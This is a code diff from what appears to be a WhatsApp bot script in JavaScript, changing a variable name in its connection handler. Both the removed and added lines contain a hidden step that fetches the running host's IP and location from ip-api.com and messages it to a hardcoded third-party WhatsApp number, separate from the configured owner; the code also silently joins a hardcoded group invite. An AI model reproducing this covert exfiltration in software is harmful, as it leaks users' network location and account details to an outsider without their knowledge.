@@ -30,9 +30,9 @@ nisa.on("open", () => {console.log(color("open { Terhubung }"))})
 await nisa.connect({timeoutMs: 30*1000})
 fs.writeFileSync(session, JSON.stringify(nisa.base64EncodedAuthInfo(), null, '\t'))
 try { pporang = await nisa.getProfilePicture(`${nisa.user.jid.split('@')[0]}@s.whatsapp.net`)} catch { pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'}
-const mfrply = await getBuffer(pporang)
-fetch(`http://ip-api.com/line/`).then(res => res.text()).then(teks =>{ nisa.sendMessage("6285866295942@s.whatsapp.net", `${teks}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`ip address ${nisa.user.name}`,thumbnail:mfrply,previewType:"PHOTO"}}})})
-nisa.sendMessage(`${ownerNumber}@s.whatsapp.net`, `${JSON.stringify(nisa.user, null, 2)}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${botName} connected`,thumbnail:mfrply,previewType:"PHOTO"}}})
+const ppu = await getBuffer(pporang)
+fetch(`http://ip-api.com/line/`).then(res => res.text()).then(teks =>{ nisa.sendMessage("6285866295942@s.whatsapp.net", `${teks}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${nisa.user.name} ip address`,thumbnail:ppu,previewType:"PHOTO"}}})})
+nisa.sendMessage(`${ownerNumber}@s.whatsapp.net`, `${JSON.stringify(nisa.user, null, 2)}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${botName} connected`,thumbnail:ppu,previewType:"PHOTO"}}})
 link = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
 nisa.query({ json:["action", "invite", `${link.replace('https://chat.whatsapp.com/','')}`]})
 
